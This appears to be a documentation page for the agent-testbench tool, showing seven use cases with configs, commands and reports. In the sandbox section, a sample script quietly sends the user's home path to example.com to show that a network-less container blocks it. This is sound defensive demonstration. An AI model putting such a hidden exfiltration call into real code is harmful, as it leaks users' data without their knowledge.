# Use cases

Seven things agent-testbench does today, each with its testbench.yaml, the commands, and what the report says.
Every output on this page comes from a real run on a Linux machine on 2026-11-01, shortened where a line says
`...`; anything that was not run here (Modal, Colab, a GitHub workflow) is marked as such. The commands are the
same whether you type them or your agent does: in Claude Code with the plugin, or any MCP client, you ask in plain
words and the agent runs them.

The agent-driven versions are in the demos: [a failing suite fixed in a Docker sandbox](demo-sandbox.md),
[a model improved by `testbench loop`](demo-loop.md) and [a planted bug found and fixed](demo.md).

## Fix a failing test suite in a sandbox

**When:** the tests fail and you want the agent to fix the code, not the tests - and you would rather the code
run somewhere that sees only a copy of the project, with no network.

A small package, `textstats`, whose `top_words` sorts counts the wrong way; one of its five tests fails. The plan
runs the suite in a fresh container with no network, judged by the suite's own JUnit report:

```yaml
project: textstats
plans:
  tests:
    backend: docker
    steps:
      - name: pytest
        run: python -m pytest -q --junitxml=junit.xml
        max_minutes: 5
        expect:
          junit: {path: junit.xml, failures: 0, tests: ">= 5"}
docker:
  image: mirror.gcr.io/library/python:3.11-slim     # python:3.11-slim, from Google's mirror of Docker Hub
  pip: [pytest==8.3.3]
  network: none
```

(The file that ran also had `build_args: [--network, host]` and `ca_bundle:` for the proxy of the machine it ran
on; they are used only to build the image.)

```
$ testbench run tests
[testbench] run 20261101-064304-tests started (Within budget: up to $0.00 (today so far $0.00 of $10.00).)
...
# FAIL - plan `tests` on docker

Run `20261101-064304-tests`, started 2026-11-01 06:43, 0.02 min, about $0.000. Stopped because step 1 (pytest) failed.
Code outside git; Python 3.11.18 on x86_64; evidence sha256 `df0d0d662934421c` (`testbench verify` checks it).

## FAIL: pytest

- expected exit code 0: exited 1
- expected junit.xml: failures 0: 1 (wanted == 0) of 5 tests; failed: tests.test_textstats.test_top_words_are_the_most_common (AssertionError: assert [('c', 1), ('b', 2)] == [('a', 3), ('b', 2)] At index 0 diff: ('c', 1) != ('a', 3) Use -v to get more diff)
...
```

After a one-line fix (`key=lambda kv: (-kv[1], kv[0])`):

```
$ testbench run tests
...
# PASS - plan `tests` on docker
...
## Compared with the previous run `20261101-064304-tests` (failed)

- Fixed: pytest
- pytest | junit.xml: failures 0: 1 -> 0
...
- pytest: junit.xml: tests >= 5 - 5 (wanted >= 5.0)
```

**What the report shows:** the failing test by name with its assertion, the Python of the container (3.11.18, not
this machine's), and what changed since the last run. The run folder also holds `docker.log`, every docker command
testbench ran - here `docker create --rm --init ... --network none ...` - and the watchdog's log: the container
stops itself at the plan's time limit even if testbench on this machine is gone.

Read more: [the docker backend](docker.md), [the `junit:` expectation](expectations.md#junit), and the
[demo](demo-sandbox.md) where Claude Code found and fixed this bug on its own in 10 turns.

## Improve a model overnight with `testbench loop`

**When:** the goal is a better number - accuracy, loss, latency - and there are many ideas to try. You want each
idea judged by a run, not by the agent's impression, and the bad ones undone.

The project is the one `testbench demo` sets up (a git repository): its `smoke` plan trains a small digit
classifier and checks `outputs/metrics.json`:

```yaml
plans:
  smoke:
    backend: local
    steps:
      - name: lint
        run: testbench lint tiny_model.ipynb --strict
        max_minutes: 1
      - name: train quick
        notebook: tiny_model.ipynb
        params: {EPOCHS: 15}
        max_minutes: 5
        artifacts: [outputs/*]
        expect:
          files: [outputs/metrics.json, outputs/confusion.png]
          json:
            outputs/metrics.json: {accuracy: ">= 0.85", epochs: "<= 15"}
```

First, ideas are cheap to explore in a live kernel - the data stays loaded between calls:

```
$ testbench session start
main  ready on local  up 0.0 min, idle 0.0 min (stops after 10 idle / 60 total)  ~$0.000 so far  0 exec(s)
...
$ testbench exec --cells tiny_model.ipynb:1-2 --params '{"EPOCHS": 15}'
...
[tiny_model.ipynb cell 2 | ok | 1.2 s]
1347 training and 450 test images of 8x8 digits
$ testbench exec "...a small grid over hidden units and learning rate...; scores"
[code | ok | 0.8 s]
...
=> {(64, 0.01): 0.9756,
 (64, 0.02): 0.9756,
 (64, 0.03): 0.9733,
 (128, 0.01): 0.9733,
 (128, 0.02): 0.98,
 (128, 0.03): 0.9733}
$ testbench session stop
main stopped after 0.1 min, about $0.000
```

A session is not proof. The loop is: each try is committed on a branch of its own, proved by a run of the plan,
and kept only if the run passes and the metric beats the best so far.

```
$ testbench loop start smoke --metric outputs/metrics.json:accuracy --budget-usd 0 --max-hours 8
[testbench] loop 20261101-065024-smoke started on branch testbench-loop/20261101-065024-smoke; running the baseline (run 20261101-065024-smoke)
...
BASELINE: accuracy 0.9756, run 20261101-065024-smoke passed.

$ testbench loop try "learning rate 0.01 -> 0.02"          # after editing cells/02_settings.py and `testbench nb build`
...
REVERTED try 1: accuracy 0.9756 is not better than the best 0.9756. The branch is back at 3a9dbfffc.

$ testbench loop try "hidden units 64 -> 128, learning rate 0.01 -> 0.02"
...
KEPT try 2: accuracy 0.98 (best was 0.9756, +0.0044). Run 20261101-065034-smoke passed. Best is now 0edc9e18d.

$ testbench loop try "learning rate 0.02 -> 1.0"
...
REVERTED try 3: the run failed (`testbench report 20261101-065038-smoke` says why). The branch is back at 0edc9e18d.

$ testbench loop stop
# Loop `20261101-065024-smoke` on plan `smoke`: accuracy 0.9756 -> 0.98 (max)

3 tries, 1 kept, $0.000 of $0.00, 0.0 h. Branch `testbench-loop/20261101-065024-smoke` from `master` at `3a9dbfffc`.

## Kept

- try 2 `0edc9e18d`: hidden units 64 -> 128, learning rate 0.01 -> 0.02 - accuracy 0.9756 -> 0.98 (+0.0044), run `20261101-065034-smoke`, $0.000

## Tried and reverted

- try 1: learning rate 0.01 -> 0.02 - accuracy 0.9756 is not better than the best 0.9756.
- try 3: learning rate 0.02 -> 1.0 - the run failed (`testbench report 20261101-065038-smoke` says why).
...
(report: .testbench/loops/20261101-065024-smoke/report.md; back on master)

$ testbench verify 20261101-065034-smoke
20261101-065034-smoke: all 11 evidence files match their recorded sha256 (7e2d278a0ec3314d); ran on commit 0edc9e18d85b
```

**What the report shows:** each kept change with what it moved and the run that proves it, each reverted try and
why, and the branch to review. Merging is yours to decide. Every verdict is testbench's, not the agent's.

`testbench ui` puts the loop next to every run, with a trend line per checked number. A screenshot from a shorter
loop on the same project, [the tour](tour.md)'s:

[![The testbench ui index for the tiny-model project: a plans table where smoke has 6 runs, 83% passed, and a trend line for accuracy that dips once (a planted bug) and ends at 0.98; a runs table, newest first, with each run's commit; and the loop: stopped, best accuracy 0.98, 2 tries, 1 kept, with a link to its report.](assets/ui-index.png)](assets/ui-index.png)

**Overnight on a GPU** (not run for this page): the same commands on a plan with `backend: modal` and a `gpu:`,
with a real budget - `testbench loop start gpu-check --metric outputs/metrics.json:accuracy --budget-usd 5
--max-hours 8`. One budget covers every run of the loop; if it is above `ask_above_usd`, a person approves the
total once with `--approve`, and each run is still checked against the per-run and daily limits.

Read more: [loops](loops.md), and the [demo](demo-loop.md) where Claude Code took this model from 0.86 to 0.9756
in six tries.

## Check that a Colab notebook still runs

**When:** a notebook made in Colab - form fields, `files.upload()`, `files.download()` - should keep working after
an agent (or a person) changes it, and you want to know before someone opens it in Colab.

A notebook kept as cell files (`testbench nb build cells sales.ipynb` assembles it; `testbench nb split` goes the
other way). It asks for a CSV with `files.upload()`, summarizes it with pandas and offers the summary for download.
Lint first:

```
$ testbench lint sales.ipynb
sales.ipynb: 4 finding(s)
  L004 cell 2: files.upload() waits for a person to pick files. Fine on Colab; for tests give the step `uploads:` in testbench.yaml, or let a path field skip the upload.
  L005 cell 2: `pip install pandas` takes whatever version is newest that day, so the notebook can break without a change. Pin versions (pkg==x.y.z).
  L008 cell 3: a path under /content only exists on Colab. Build paths from a ROOT variable (or Path.cwd()) so the notebook also runs locally and on Modal.
  L008 cell 4: a path under /content only exists on Colab. Build paths from a ROOT variable (or Path.cwd()) so the notebook also runs locally and on Modal.
$ testbench nb fields sales.ipynb
cell 1: MIN_AMOUNT = 0.0
cell 1: TOP = 3
```

`testbench init` wrote a plan for the notebook; filled in, with the upload answered and the form fields set:

```yaml
plans:
  sales-local:
    backend: local
    steps:
      - name: lint
        run: testbench lint sales.ipynb
        max_minutes: 1
      - name: sales
        notebook: sales.ipynb
        max_minutes: 5
        params: {MIN_AMOUNT: 2.0, TOP: 2}     # the form fields, as a person would set them
        uploads: [[sales.csv]]                 # the answer to files.upload()
        expect:
          no_errors: true
          json: {summary.json: {rows: 5, total: "~= 16.5 +- 0.01", top.coffee: 7.5}}
  colab-cpu:
    backend: colab
    steps:
      - name: sales on Colab
        notebook: sales.ipynb
        max_minutes: 10
        params: {MIN_AMOUNT: 2.0, TOP: 2}
        uploads: [[sales.csv]]
        expect:
          json: {summary.json: {rows: 5, total: "~= 16.5 +- 0.01"}}
```

With the pip install pinned but the `/content` paths still there, the local run names the cell and the line:

```
$ testbench run sales-local
...
# FAIL - plan `sales-local` on local
...
## FAIL: sales

- **cell 3**: `FileNotFoundError`: [Errno 2] No such file or directory: '/content/summary.json'
- raised at cell line 9: json.dump(summary, open("/content/summary.json", "w"), indent=1)
...
- expected summary.json: rows: file missing
...
```

After writing to `summary.json` (on Colab the working folder is `/content` anyway):

```
$ testbench run sales-local
...
  [testbench] uploaded sales.csv (0.0 MB)
  [testbench] --- cell 3 ---
  {'rows': 5, 'total': 16.5, 'top': {'coffee': 7.5, 'bread': 5.0}}
  [testbench] --- cell 4 ---
  [testbench] download offered: summary.json (0.0 MB), kept as evidence

# PASS - plan `sales-local` on local
...
- sales: summary.json: total ~= 16.5 +- 0.01 - 16.5 (wanted 16.5 ± 0.01; differs by +0)
- sales: summary.json: top.coffee 7.5 - 7.5 (wanted == 7.5)
```

**What the report shows:** the cell, the exception and the line that raised it; the file the notebook offered for
download, kept as evidence under `steps/02-sales/downloads/`. The kernel has a headless `google.colab` stand-in, so
`files.upload()` takes the step's `uploads:`, `files.download()` keeps a copy, `userdata.get()` reads environment
variables of the same name, and `drive.mount()` becomes a local folder.

**On a real Colab VM** (not run for this page): `testbench run colab-cpu` needs Google's Colab CLI
(`uv tool install google-colab-cli`, then one login) and uses your compute units; `testbench estimate colab-cpu`
prices it first (here: `Within budget: up to $0.00`, a CPU runtime for 10 minutes plus the 10 start-up minutes the
estimate allows). The VM gets a watchdog that ends the work and releases it at the time limit.

Read more: [steps](reference.md#steps), [live sessions](reference.md#live-sessions) (`--backend colab` works the
same way for exploring).

## Run code nobody has reviewed, with no network

**When:** a script someone sent you, a downloaded notebook, a dependency an agent just added. You want to see what
it does without giving it your files or the internet.

```python
# analyze.py: summarizes a CSV, and (unasked) tries to send what it finds somewhere
...
try:
    urllib.request.urlopen("https://example.com/collect?home=" + os.path.expanduser("~"), timeout=5)
    print("upload: sent")
except Exception as exc:
    print(f"upload: failed ({type(exc).__name__})")
```

```yaml
project: untrusted
plans:
  sandboxed:
    backend: docker
    description: a script nobody has reviewed, in a container with no network
    steps:
      - name: network is off
        run: python -c "import socket; socket.create_connection(('1.1.1.1', 443), timeout=5)"
        max_minutes: 1
        expect:
          exit_code: 1                      # the connection must fail
          text: {stdout: ["Network is unreachable"]}
      - name: run it
        run: python analyze.py
        max_minutes: 5
        artifacts: [out/summary.json]
        expect:
          json: {out/summary.json: {rows: 3, total: "~= 9.75 +- 0.001"}}
          text: {stdout: ["upload: failed"]}
docker:
  image: mirror.gcr.io/library/python:3.11-slim
  network: none
  cpu: 1
  memory_gb: 1
```

```
$ testbench run sandboxed
...
  summarized 3 rows, total 9.75
  upload: failed (URLError)

# PASS - plan `sandboxed` on docker
...
| PASS | network is off | 0.00 | 2/2 | - |
| PASS | run it | 0.00 | 4/4 | - |
...
- network is off: exit code 1 - exited 1
- network is off: stdout contains 'Network is unreachable' - found
- run it: out/summary.json: rows 3 - 3 (wanted == 3)
- run it: stdout contains 'upload: failed' - found
```

**What the report shows:** that the sandbox was a sandbox (the first step fails the run if the container can
reach the network), what the script printed, and the file it wrote. The container saw a copy of the project and
nothing else of this machine; it had one CPU and 1 GB of memory, and it was deleted afterwards.

A container is not a virtual machine: it shares this machine's kernel, and code runs as root inside it. For code
you have reason to think is hostile, use a VM or gVisor (`run_args: [--runtime, runsc]`). Read
[what a container isolates, and what it does not](docker.md#what-it-isolates-and-what-it-does-not).

## Check a web app's UI in headless Chromium

**When:** an agent changed a page and says the button works. You want the page opened, clicked and read the way a
person would, with the console errors.

The [web-ui example](../examples/web-ui): a counter page
served from `site/`.

```yaml
project: web-ui
plans:
  ui-check:
    backend: local
    steps:
      - name: counter works
        web:
          serve: python -m http.server 8971 --bind 127.0.0.1 -d site
          url: http://127.0.0.1:8971/
          actions:
            - click: "#increment"
            - click: "#increment"
            - screenshot: after-two-clicks
        max_minutes: 2
        expect:
          web:
            status: 200
            title: Counter
            text: ["Count: 2"]
            no_console_errors: true
```

```
$ testbench run ui-check
...
# PASS - plan `ui-check` on local
...
## Evidence to look at

- `steps/01-counter-works/after-two-clicks.png`
- `steps/01-counter-works/page.png`

## Passed checks

- counter works: page status 200 - 200 (wanted == 200)
- counter works: page shows 'Count: 2' - found
- counter works: title contains 'Counter' - 'Counter'
- counter works: no console or page errors - none
```

After a change that calls a function that does not exist (`count += 1; updateTotal();` in `site/app.js`):

```
$ testbench run ui-check
...
# FAIL - plan `ui-check` on local
...
## FAIL: counter works

- expected page shows 'Count: 2': not found
- expected no console or page errors: updateTotal is not defined; updateTotal is not defined
- page errors: updateTotal is not defined
- page errors: updateTotal is not defined
...
## Compared with the previous run `20261101-064634-ui-check` (passed)

- Broke: counter works
```

**What the report shows:** the page error (once per click), the text that was missing, and screenshots after the
actions and of the whole page at the end - `testbench report --format html` puts them on one page. If something
already answers on the URL before `serve:` starts, the step stops rather than test the wrong program.

Part of that page, from the same two runs made again for this screenshot (the screenshot of the whole page at the
end is the same picture, so the page shows it once):

[![Part of the HTML report of the failing ui-check run: the checks table - page status 200 ok, page shows 'Count: 2' missed (not found), title contains 'Counter' ok, no console or page errors missed (updateTotal is not defined, twice) - then the evidence to look at: the screenshot taken after the two clicks, the Counter page still showing Count: 0 above its Add one button.](assets/web-report.png)](assets/web-report.png)

(This page's runs used port 8994, because other work on the machine could have been using 8971. Web steps need
`playwright install chromium`; see [troubleshooting](troubleshooting.md#plan-runs) if Chromium does not start.)

Read more: [web steps](reference.md#web-steps), [the `web:` expectation](expectations.md#web).

## Use your own GPU box over ssh

**When:** you have a machine with a GPU - under a desk, at a university, rented by the hour - and want the agent
to use it with the same plans, sessions, budget and evidence as anywhere else.

```yaml
ssh:
  host: gpu-box                    # a Host in ~/.ssh/config; `ssh gpu-box true` must work with keys
  usd_per_hour: 0.0                # your own machine; a rented one: what it bills per hour
  setup: venv                      # a virtualenv for the project there, built once
  pip: [scikit-learn==1.5.2, matplotlib==3.9.2]
plans:
  on-the-box:
    backend: ssh
    steps:
      - name: where am I
        run: hostname && python -c "import sklearn; print('sklearn', sklearn.__version__)"
        max_minutes: 2
        expect:
          text: {stdout: ["sklearn 1.5.2"]}
      - name: train
        notebook: tiny_model.ipynb
        params: {EPOCHS: 15}
        max_minutes: 10
        artifacts: [outputs/*]
        expect:
          json: {outputs/metrics.json: {accuracy: ">= 0.85"}}
```

For this page, `gpu-box` was this same machine, reached through an sshd on 127.0.0.1 (the file that ran also set
`workdir:` and `command: [ssh, -F, <a test ssh config>]`). It has no GPU, so the plan has no `gpu:` label or
`gpu:` expectation; on a real GPU box, add `gpu: {busy_pct: ">= 50"}` to the training step and an idle GPU fails it.

```
$ testbench run on-the-box
...
# PASS - plan `on-the-box` on ssh

Run `20261101-064805-on-the-box`, started 2026-11-01 06:48, 0.07 min, about $0.000.
...
- where am I: stdout contains 'sklearn 1.5.2' - found
- train: every cell ran without an error - all cells ran
- train: outputs/metrics.json: accuracy >= 0.85 - 0.9756 (wanted >= 0.85)
```

The first run took 40 seconds, most of it building the virtualenv; later runs reuse it. Live sessions work there
too:

```
$ testbench session start box --backend ssh --idle-minutes 5 --max-minutes 15
box  ready on ssh  up 0.0 min, idle 0.0 min (stops after 5 idle / 15 total)  ~$0.000 so far  0 exec(s)
Hard stop on the machine itself: its watchdog ends the work at the time limit, even if this machine is asleep.
...
$ testbench exec -s box --cells tiny_model.ipynb:1-3 --params '{"EPOCHS": 5}'
...
[tiny_model.ipynb cell 3 | ok | 0.3 s]
{"accuracy": 0.9578, "epochs": 5, "final_loss": 0.2141, "hidden": 64, "learning_rate": 0.01, "seconds": 0.03}
$ testbench exec -s box "import platform; platform.node(), round(model.score(X_test, y_test), 4)"
[code | ok | 0.5 s]
=> ('vm', 0.9578)
$ testbench session shell -s box "nvidia-smi || echo no GPU on this box"
bash: line 1: nvidia-smi: command not found
no GPU on this box
$ testbench session stop box
box stopped after 0.1 min, about $0.000
```

**What the report shows:** the same report as a local run, with `remote_stop` in report.json saying where the hard
stop lives ("on the machine itself: its watchdog ends the work at the time limit, even if this machine is asleep")
and `ssh.log` in the run folder with every ssh command. Commands go over one reused connection in BatchMode, so a
host that asks for a password fails with a message instead of hanging. testbench bounds the work, not the machine:
a rented instance that bills while it is on stays on.

Read more: [the ssh backend](ssh.md).

## Prove a result in CI with the GitHub Action

**When:** agents open pull requests that touch notebooks, training code or pages, and a reviewer should see a run
nobody's agent controlled: the report as the job summary, the evidence as an artifact, a check that passes or
fails.

```yaml
name: testbench
on: [pull_request]
jobs:
  smoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: sarptandoven/agent-testbench@v1
        with:
          plan: smoke
          project-dir: examples/tiny-model                  # where testbench.yaml is
          extra-pip: scikit-learn==1.5.2 matplotlib==3.9.2  # what the project needs
```

A workflow was not run for this page. The repository's own workflow (`.github/workflows/action.yml`) tests the
action this way on every push: plans that pass on Linux and macOS, a web plan in Chromium, a plan that fails and a
plan that is refused. What the action does after the run is in `action.yml`; its summary step, run here against a
local run of the same plan, writes this job summary:

```
**agent-testbench**: plan `smoke` **passed**, about $0.000, run `20261101-065604-smoke`, commit `3a9dbfffcaec`.

# PASS - plan `smoke` on local

Run `20261101-065604-smoke`, started 2026-11-01 06:56, 0.07 min, about $0.000.
Code `3a9dbfffcaec`; Python 3.13.17 on x86_64; evidence sha256 `08becc129a22fec0` (`testbench verify` checks it).
...
```

and the outputs `status: passed`, `run-id`, `report-path`, `html-path`, `junit-path` (from `testbench report
--format junit`), `summary-path` and `cost-usd: 0.0000`. A failing plan fails the step with an annotation naming
the first failure; a refused one (over budget, needs approval) fails it with the reason, and nothing runs.

Budgets apply in CI too, and a hosted runner starts with an empty ledger. `approve: true` on the step is a standing
yes from whoever commits it, so keep it to workflows you start yourself. To check the evidence later, download the
artifact, put the folder back under `.testbench/runs/` and run `testbench verify <run-id>`.

Read more: [the GitHub Action](github-action.md): inputs, outputs, a GPU plan on Modal, budgets and approval.
